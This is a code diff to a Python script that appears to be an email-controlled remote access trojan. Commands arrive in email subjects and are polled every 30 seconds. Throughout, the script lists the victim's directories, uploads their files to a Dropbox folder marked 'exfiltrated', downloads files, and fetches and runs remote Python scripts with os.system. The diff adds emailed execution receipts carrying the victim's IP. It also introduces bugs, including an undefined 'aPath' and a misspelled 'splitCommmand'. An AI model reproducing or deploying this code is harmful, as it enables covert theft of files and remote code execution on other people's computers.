@@ -41,11 +41,21 @@ def upload_file(path):
     with open(path, 'rb') as f:
         dbx.files_upload(f.read(), '/' + ip + '/exfiltrated' + path)
 
+    #SEND AN EMAIL AS RECEIPT OF EXECUTION
+    execution_receipt = "Subject: Uploaded " + path + " from " + str(getIP()) + "s computer " + "\n\n"
+    execution_receipt += "Successfuly uploaded file to dropbox"
+    sendEmail(execution_receipt)
+
 #Download a file from dropbox
-def download_file(filePath, localname):
-    with open(localname, "w") as f:
+def download_file(filePath, localName):
+    with open(localName, "w") as f:
         metadata, res = dbx.files_download(path=filePath)
         f.write((res.content).decode())
+
+    #SEND AN EMAIL AS RECEIPT OF EXECUTION
+    execution_receipt = "Subject: Dowloaded " + filePath + " into " + localName + " file in " + str(getIP()) + "\n\n"
+    execution_receipt += "Successfuly downloaded from dropbox"
+    sendEmail(execution_receipt)
 
 #Send email with msg over SMTP SSL
 def sendEmail(msg):
@@ -59,74 +69,74 @@ def sendEmail(msg):
 
 #EMAIL SUBJECT = show [Directory path]
 #NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
-def showFiles(com):
+def showFiles(commandString):
     dirList = []
     fileList = []
-    splitCom = com.split(" ")
-    del(splitCom[0])
-    actualPath = splitCom[0]
-    for x in os.listdir(actualPath):
-        if os.path.isdir(os.path.join(actualPath, x)):
+    splitCommand = commandString.split(" ")
+    del(splitCommand[0])
+    truePath = splitCommand[0]
+    for x in os.listdir(truePath):
+        if os.path.isdir(os.path.join(aPath, x)):
             dirList.append(x)
-        elif os.path.isfile(os.path.join(actualPath, x)):
+        elif os.path.isfile(os.path.join(truePath, x)):
             fileList.append(x)
 
     directories_string = ""
+    files_string = ""
     for dir in dirList:
         directories_string += dir + "\n"
-    files_string = ""
     for file in fileList:
         files_string += file + "\n"
     subjectLine = "Subject: My Directory\n\n"
     payload = subjectLine
     payload += "Files:\n" + files_string + "\nDirectories:\n" + directories_string
-    #print(payload)
     sendEmail(payload)
 
 #EMAIL SUBJECT = fetch [file name]
-def getFile(com):
-    splitCom = com.split(" ")
-    del(splitCom[0])
-    filePath = splitCom[0]
+def getFile(commandString):
+    splitCommand = commandString.split(" ")
+    del(splitCommand[0])
+    filePath = splitCommand[0]
     upload_file(filePath)
 
 #EMAIL SUBJECT = download [file name] [local name]
-def receiveFile(com):
-    splitCom = com.split(" ")
-    del(splitCom[0])
-    filePath = splitCom[0]
-    localPath = splitCom[1]
+def receiveFile(commandString):
+    splitCommmand = commandString.split(" ")
+    del(splitCommand[0])
+    filePath = splitCommand[0]
+    localPath = splitCommand[1]
     download_file(filePath, localPath)
 
 #EMAIL SUBJECT = execute [file path from dropbox with python script]
-def executeCom(com):
-    splitCom = com.split(" ")
-    del(splitCom[0])
-    execCom = splitCom[0]
-    download_file(execCom, executable_file)
+def executeCom(commandString):
+    splitCommand = commandString.split(" ")
+    del(splitCommand[0])
+    execCommand = splitCommand[0]
+    download_file(execCommand, executable_file)
     os.system('python ' + executable_file)
     os.remove(executable_file)
+
     #SEND AN EMAIL AS RECEIPT OF EXECUTION
-    execution_receipt = "Subject: Executed " + execCom + "on " + str(getIP()) + "\n\n"
+    execution_receipt = "Subject: Executed " + execCommand + "on " + str(getIP()) + "\n\n"
     execution_receipt += "Successfuly executed script"
     sendEmail(execution_receipt)
 
 #Parse commands from emails
-def commandParser(coms):
-    while coms:
-        command = coms[0]
+def commandParser(commandsParse):
+    while commandsParse:
+        command = commandsParse[0]
         if "show" in command:
             showFiles(command)
-            del coms[0]
+            del commandsParse[0]
         elif "fetch" in command:
             getFile(command)
-            del coms[0]
+            del commandsParse[0]
         elif "execute" in command:
             executeCom(command)
-            del coms[0]
+            del commandsParse[0]
         elif "download" in command:
             receiveFile(command)
-            del coms[0]
+            del commandsParse[0]
 
 #Read an email
 def readEmail():
@@ -163,4 +173,5 @@ def periodicUpdates(seconds):
         #sendEmail(message)
         time.sleep(seconds - ((time.time() - startTime) % seconds))
 
+init_dbx()
 periodicUpdates(30.0)
